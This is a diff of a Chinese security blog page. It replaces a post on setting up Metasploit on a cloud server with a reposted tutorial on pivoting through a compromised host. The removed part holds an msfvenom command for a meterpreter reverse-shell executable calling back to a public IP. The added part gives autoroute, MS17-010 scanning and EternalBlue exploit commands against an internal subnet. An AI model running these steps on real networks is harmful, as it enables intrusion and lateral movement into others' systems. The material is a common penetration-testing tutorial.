@@ -104,22 +104,20 @@
 
 
 
-<meta name="description" content="准备1.首先去阿里云买一个学生机。点我：阿里云学生机购买地址2.预装环境选择Ubuntu，版本无所谓，不过阿里的好像就16.04 64位。地区什么的选择你所在地区，其他都无所谓。(这里可以先买一个月来试试水) 开始安装 首先登陆阿里云云服务器控制台。点我找到如下界面。选择你相关的地区，就可以看到你的实例了，然后这里记住你的两个ip地址即可。然后下载一个xshell与xftp来链接服务器。(具体怎么">
+<meta name="description" content="基本概念MSF的跳板功能，其实是MSF框架中自带的一个路由转发功能，其实现过程就是MSF框架在已经获取的meterpreter shell的基础上添加一条去往“内网”的路由，此路由的下一跳转发，即网关是MSF攻击平台与被攻击目标建立的一个session会话，具体理解大家可以见拓扑图：通过msf添加路由功能，可以直接使用msf去访问原本不能直接访问的内网资源，只要路由可达了那么我们使用msf的强大功">
 <meta name="keywords" content="Msf">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Linux下搭建外网Msf">
-<meta property="og:url" content="http://yoursite.com/2017/11/01/linux搭建外网的msf笔记/index.html">
+<meta property="og:title" content="MSF通过跳板入内网">
+<meta property="og:url" content="http://yoursite.com/2017/11/04/使用MSF路由转发实现MSF框架的内网渗透/index.html">
 <meta property="og:site_name" content="老酒馆的怅然若梦">
-<meta property="og:description" content="准备1.首先去阿里云买一个学生机。点我：阿里云学生机购买地址2.预装环境选择Ubuntu，版本无所谓，不过阿里的好像就16.04 64位。地区什么的选择你所在地区，其他都无所谓。(这里可以先买一个月来试试水) 开始安装 首先登陆阿里云云服务器控制台。点我找到如下界面。选择你相关的地区，就可以看到你的实例了，然后这里记住你的两个ip地址即可。然后下载一个xshell与xftp来链接服务器。(具体怎么">
+<meta property="og:description" content="基本概念MSF的跳板功能，其实是MSF框架中自带的一个路由转发功能，其实现过程就是MSF框架在已经获取的meterpreter shell的基础上添加一条去往“内网”的路由，此路由的下一跳转发，即网关是MSF攻击平台与被攻击目标建立的一个session会话，具体理解大家可以见拓扑图：通过msf添加路由功能，可以直接使用msf去访问原本不能直接访问的内网资源，只要路由可达了那么我们使用msf的强大功">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://oymn0s4fo.bkt.clouddn.com/kztyvhve7o2bj5csoaofaivx11.png">
-<meta property="og:image" content="http://oymn0s4fo.bkt.clouddn.com/9kr5mk5m1ujl94yb86zu1wwnx9.png">
-<meta property="og:image" content="http://oymn0s4fo.bkt.clouddn.com/ioajm1mtks4f5votgc38h7243g.png">
-<meta property="og:updated_time" content="2017-11-01T10:42:10.377Z">
+<meta property="og:image" content="http://oymn0s4fo.bkt.clouddn.com/zlg48a5w8ftuinhxliht00yvte.png">
+<meta property="og:updated_time" content="2017-11-05T04:37:53.949Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Linux下搭建外网Msf">
-<meta name="twitter:description" content="准备1.首先去阿里云买一个学生机。点我：阿里云学生机购买地址2.预装环境选择Ubuntu，版本无所谓，不过阿里的好像就16.04 64位。地区什么的选择你所在地区，其他都无所谓。(这里可以先买一个月来试试水) 开始安装 首先登陆阿里云云服务器控制台。点我找到如下界面。选择你相关的地区，就可以看到你的实例了，然后这里记住你的两个ip地址即可。然后下载一个xshell与xftp来链接服务器。(具体怎么">
-<meta name="twitter:image" content="http://oymn0s4fo.bkt.clouddn.com/kztyvhve7o2bj5csoaofaivx11.png">
+<meta name="twitter:title" content="MSF通过跳板入内网">
+<meta name="twitter:description" content="基本概念MSF的跳板功能，其实是MSF框架中自带的一个路由转发功能，其实现过程就是MSF框架在已经获取的meterpreter shell的基础上添加一条去往“内网”的路由，此路由的下一跳转发，即网关是MSF攻击平台与被攻击目标建立的一个session会话，具体理解大家可以见拓扑图：通过msf添加路由功能，可以直接使用msf去访问原本不能直接访问的内网资源，只要路由可达了那么我们使用msf的强大功">
+<meta name="twitter:image" content="http://oymn0s4fo.bkt.clouddn.com/zlg48a5w8ftuinhxliht00yvte.png">
 
 
 
@@ -149,13 +147,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2017/11/01/linux搭建外网的msf笔记/"/>
+  <link rel="canonical" href="http://yoursite.com/2017/11/04/使用MSF路由转发实现MSF框架的内网渗透/"/>
 
 
 
 
 
-  <title>Linux下搭建外网Msf | 老酒馆的怅然若梦</title>
+  <title>MSF通过跳板入内网 | 老酒馆的怅然若梦</title>
   
 
 
@@ -302,7 +300,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/01/linux搭建外网的msf笔记/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/04/使用MSF路由转发实现MSF框架的内网渗透/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="love71">
@@ -319,7 +317,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Linux下搭建外网Msf</h1>
+          <h1 class="post-title" itemprop="name headline">MSF通过跳板入内网</h1>
         
 
         <div class="post-meta">
@@ -331,8 +329,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-01T17:42:00+08:00">
-                2017-11-01
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-04T00:54:58+08:00">
+                2017-11-04
               </time>
             
 
@@ -354,8 +352,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/服务器/" itemprop="url" rel="index">
-                    <span itemprop="name">服务器</span>
+                  <a href="/categories/内网/" itemprop="url" rel="index">
+                    <span itemprop="name">内网</span>
                   </a>
                 </span>
 
@@ -391,36 +389,89 @@
       
 
       
-        <h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>1.首先去阿里云买一个学生机。<a href="https://promotion.aliyun.com/ntms/campus2017.html?utm_medium=text&amp;utm_source=baidu&amp;utm_campaign=xsj&amp;utm_content=se_465233" target="_blank" rel="external">点我：阿里云学生机购买地址</a><br>2.预装环境选择<strong>Ubuntu</strong>，版本无所谓，不过阿里的好像就16.04 64位。<br>地区什么的选择你所在地区，其他都无所谓。(这里可以先买一个月来试试水)</p>
-<h2 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h2><ul>
-<li><p>首先登陆阿里云云服务器控制台。<a href="https://ecs.console.aliyun.com/" target="_blank" rel="external">点我</a>找到如下界面。<br><img src="http://oymn0s4fo.bkt.clouddn.com/kztyvhve7o2bj5csoaofaivx11.png" alt=""><br>选择你相关的地区，就可以看到你的实例了，然后这里记住你的两个ip地址即可。然后下载一个xshell与xftp来链接服务器。(具体怎么弄百度一下，很简单)。如果忘记了登陆密码点击这里修改一下就好了。<br><img src="http://oymn0s4fo.bkt.clouddn.com/9kr5mk5m1ujl94yb86zu1wwnx9.png" alt=""><br>现在环境我们就准备好了。</p>
-</li>
-<li><p>在Xshell里面依次执行下面的命令：<br>1.<code>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall</code><br>2.<code>chmod 755 msfinstall</code><br>3.<code>./msfinstall</code><br>然后就成功安装了。</p>
-</li>
-<li><p>自己启动msf：msfconsole<br><strong>这里他会提示你是否创建新的数据库，输入：no在回车就好了。</strong></p>
-<blockquote>
-<p><strong>要是关于数据库问题失败的话就自己建立一个postgresql数据库</strong><br>1、apt-get install postgresql    //安装postgresql数据库<br>2、su - postgres                       //切换到postgres用户<br>3、psql                                     //登陆postgresql数据库，首次登陆没有密码<br>4、\password postgres             //修改数据库用户postgres的密码<br>安装数据库的时候会自动创建系统用户postgres,数据库用户postgres,数据库postgres</p>
-</blockquote>
+        <h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>MSF的跳板功能，其实是MSF框架中自带的一个路由转发功能，其实现过程就是MSF框架在已经获取的meterpreter shell的基础上添加一条去往“内网”的路由，此路由的下一跳转发，即网关是MSF攻击平台与被攻击目标建立的一个session会话，具体理解大家可以见拓扑图：<br><img src="http://oymn0s4fo.bkt.clouddn.com/zlg48a5w8ftuinhxliht00yvte.png" alt=""><br>通过msf添加路由功能，可以直接使用msf去访问原本不能直接访问的内网资源，只要路由可达了那么我们使用msf的强大功能，想干什么就干什么了。</p>
+<h2 id="msf-跳板实现过程"><a href="#msf-跳板实现过程" class="headerlink" title="msf 跳板实现过程"></a>msf 跳板实现过程</h2><ul>
+<li><h3 id="基本过程"><a href="#基本过程" class="headerlink" title="基本过程"></a>基本过程</h3></li>
+</ul>
+<ol>
+<li>需要有一个已经获取的meterpreter 会话； </li>
+<li>获取内网地址网段 </li>
+<li>在MSF平台上添加去往“内网网段”的路由 </li>
+</ol>
 <ul>
-<li>msf使用数据库<blockquote>
-<p>1、msfconsole                                                              //启动msf<br>2、db_connect postgres:hehehe@127.0.0.1/test         //用户名，密码，地址，自己随意编造的名字。<br>3、db_status                                                                //查看数据库连接状态,如果提示postgresql connected to test则成功。<br>还是不行就先执行db_disconnect命令，在db_connect database。</p>
+<li><h3 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h3></li>
+</ul>
+<ol>
+<li><strong>已经获取一个meterpreter shell </strong><br>第1个条件，是我们要想办法获取一个MSF攻击平台与目标主机的shell会 话（meterpreter）,然后利用此会话。<blockquote>
+<p>MSF 路由添加帮助查询命令如下：<br>meterpreter &gt; run autoroute -h<br>run autoroute -s 172.2.165.0/24  //添加172.2.165.0-255这个ip段<br>run autoroute -s 172.2.165.75   //添加单个ip地址<br>run autoroute -p   //查看路由的添加情况<br>run autoroute -d -s 172.2.165.0   //删除172.2.165.0/24这个ip路由<br>run get_local_subnets  //获取被攻击目标内网地址网段</p>
 </blockquote>
 </li>
-</ul>
+</ol>
+<ul>
+<li><h3 id="具体操作过程"><a href="#具体操作过程" class="headerlink" title="具体操作过程"></a>具体操作过程</h3><ol>
+<li>首先获得跳板机的sessions，然后进入meterpreter</li>
+<li><blockquote>
+<p>meterpreter &gt; run get_local_subnets   //执行获取肉鸡所在内网网段。</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>meterpreter &gt; run autoroute -s 10.48.8.0/24 //添加路由</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>meterpreter &gt; run autoroute -p   //查看路由</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>meterpreter &gt; background  //需要退到MSF攻击平台的操作面,调用其他模块。</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>msf&gt;use auxiliary/scanner/smb/smb_ms17_010  //调用扫描器来扫ms17-10</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>show options   //查看设置</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>set rhosts 10.48.8.0/24  //设置要扫描的ip段</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>set threads 50     //设置线程50</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>run      //运行</p>
+</blockquote>
+</li>
+</ol>
 </li>
 </ul>
-<h2 id="使用msf做简单反弹"><a href="#使用msf做简单反弹" class="headerlink" title="使用msf做简单反弹"></a>使用msf做简单反弹</h2><ul>
-<li>首先你得登陆阿里云控制中心，找到安全组配置如下：<br><img src="http://oymn0s4fo.bkt.clouddn.com/ioajm1mtks4f5votgc38h7243g.png" alt=""><br>入口向与进口向保持一致。</li>
-<li><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=公网ip LPORT=你添加的端口 -f exe &gt; 8888.exe</code></li>
-<li>然后就是监听。<br><code>set LHOST 内网ip</code> //注意这里的监听ip是你的内网ip，不是公网ip。<br>这样就成功搭建了一个外网msf了。</li>
+<p><strong>这里就可以探测到哪些电脑存在漏洞了</strong></p>
+<ul>
+<li><h5 id="调用攻击模块ms17-10攻击了。"><a href="#调用攻击模块ms17-10攻击了。" class="headerlink" title="调用攻击模块ms17-10攻击了。"></a>调用攻击模块ms17-10攻击了。</h5><ol>
+<li><blockquote>
+<p>use exploit/multi/handler  //得先进入监听模板，因为攻击成功后会直接反弹回会话。</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>msf exploit(handler) &gt; use exploit/windows/smb/ms17_010_eternalblue  //使用exp</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>set rhost 10.48.8.236  //设置存在漏洞的目标</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>exploit  //然后就开始攻击了，成功后会直接弹回会话。</p>
+</blockquote>
+</li>
+</ol>
+</li>
 </ul>
-<h2 id="安装Shellinabox"><a href="#安装Shellinabox" class="headerlink" title="安装Shellinabox"></a>安装Shellinabox</h2><p> 在Debian / Ubuntu系统上：</p>
-<pre><code>$ sudo apt-get install shellinabox
-</code></pre><p>然后直接执行命令：<br> <code>1.SHELLINABOX_ARGS=&quot;--no-beep -s /:SSH:服务器ip&quot;</code><br> <code>2./etc/init.d/shellinaboxd  restart</code> //这是启动该服务，在访问<a href="https://ip:4200" target="_blank" rel="external">https://ip:4200</a> 即可，4200是默认端口，https传输。这里证书会报错，添加例外就可以了。</p>
-<p> 如果想修改端口呢，执行下面命令：<br> <code>shellinaboxd -t -b -p 1234</code>   #-b选项代表在后台启动，-t选项表示不使用https方式启动 -p选项表示指定端口。<br> 这里访问<a href="http://ip:1234" target="_blank" rel="external">http://ip:1234</a> 即可，采用http传输，也没证书的事情了。</p>
-<p> 观察服务监听的端口：<br><code>netstat -tnlp | grep shellinabox</code></p>
-<p>注意：这里root用户是登陆默认是不能登陆的，得使用其他用户登陆，新建一个用户adduser name输入2次密码，创建成功。</p>
-<p>相关链接：<br><a href="http://www.haiyun.me/archives/shellinabox-web-terminal.html" target="_blank" rel="external">shellinabox搭建过程</a><br><a href="https://jingyan.baidu.com/article/2c8c281dabacad0008252aa6.html" target="_blank" rel="external">msf安装过程</a></p>
+<p>文章转载：<a href="http://www.360zhijia.com/360anquanke/279544.html" target="_blank" rel="external">使用 MSF 路由转发实现MSF框架的内网渗透</a><br>结语：因为文章思路清新明确，所以转载记录。</p>
 
       
     </div>
@@ -451,8 +502,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/10/30/走过的风景看过的人/" rel="next" title="走过的风景，看过的人">
-                <i class="fa fa-chevron-left"></i> 走过的风景，看过的人
+              <a href="/2017/11/03/Windows下链接Ubuntu远程桌面/" rel="next" title="Windows建立与Ubuntu16.04远程桌面链接">
+                <i class="fa fa-chevron-left"></i> Windows建立与Ubuntu16.04远程桌面链接
               </a>
             
           </div>
@@ -461,8 +512,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/11/03/Windows下链接Ubuntu远程桌面/" rel="prev" title="Windows建立与Ubuntu16.04远程桌面链接">
-                Windows建立与Ubuntu16.04远程桌面链接 <i class="fa fa-chevron-right"></i>
+              <a href="/2017/11/05/那一箭回来了/" rel="prev" title="那一箭回来了">
+                那一箭回来了 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -601,7 +652,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#准备"><span class="nav-number">1.</span> <span class="nav-text">准备</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#开始安装"><span class="nav-number">2.</span> <span class="nav-text">开始安装</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用msf做简单反弹"><span class="nav-number">3.</span> <span class="nav-text">使用msf做简单反弹</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#安装Shellinabox"><span class="nav-number">4.</span> <span class="nav-text">安装Shellinabox</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#基本概念"><span class="nav-number">1.</span> <span class="nav-text">基本概念</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#msf-跳板实现过程"><span class="nav-number">2.</span> <span class="nav-text">msf 跳板实现过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基本过程"><span class="nav-number">2.1.</span> <span class="nav-text">基本过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实现过程"><span class="nav-number">2.2.</span> <span class="nav-text">实现过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#具体操作过程"><span class="nav-number">2.3.</span> <span class="nav-text">具体操作过程</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#调用攻击模块ms17-10攻击了。"><span class="nav-number">2.3.0.1.</span> <span class="nav-text">调用攻击模块ms17-10攻击了。</span></a></li></ol></li></ol></li></ol></li></ol></div>
             
 
           </div>
